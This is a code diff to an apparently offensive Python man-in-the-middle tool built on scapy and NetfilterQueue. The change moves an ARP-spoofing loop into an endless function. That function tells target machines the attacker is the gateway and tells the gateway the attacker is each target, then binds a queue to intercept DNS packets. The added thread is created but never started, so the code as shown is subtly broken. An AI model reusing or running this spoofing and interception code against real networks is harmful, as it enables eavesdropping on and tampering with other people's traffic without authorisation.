@@ -2,6 +2,7 @@ import scapy.all as scapy
 # from scapy.all import *
 import time
 import os
+import threading
 from MITM.MITM_misc import getMask1Bits
 from netfilterqueue import NetfilterQueue
 
@@ -146,6 +147,15 @@ def modify_packet(packet):
 
     return packet
 
+def spoofing(targets, host, devices, verbose=True):
+    while True:
+        for target in targets:
+            # telling the `target` that we are the `host`
+            spoof(target, host, devices, verbose)
+            # telling the `host` that we are the `target`
+            spoof(host, target, devices, verbose)
+        time.sleep(1)
+
 
 if __name__ == "__main__":
     host = getGatewayIP()
@@ -175,15 +185,8 @@ if __name__ == "__main__":
     queue = NetfilterQueue()
 
     try:
-        print("Spoofing...")
-        for i in range(5):
-            for target in targets:
-                # telling the `target` that we are the `host`
-                spoof(target, host, devices, verbose)
-                # telling the `host` that we are the `target`
-                spoof(host, target, devices, verbose)
-            time.sleep(1)
-
+        spoofingThread = threading.Thread(target=spoofing, args=(targets, host, devices, verbose))
+        time.sleep(5)
         print("DNS lintening...")
         queue.bind(QUEUE_NUM, process_packet)
         queue.run()
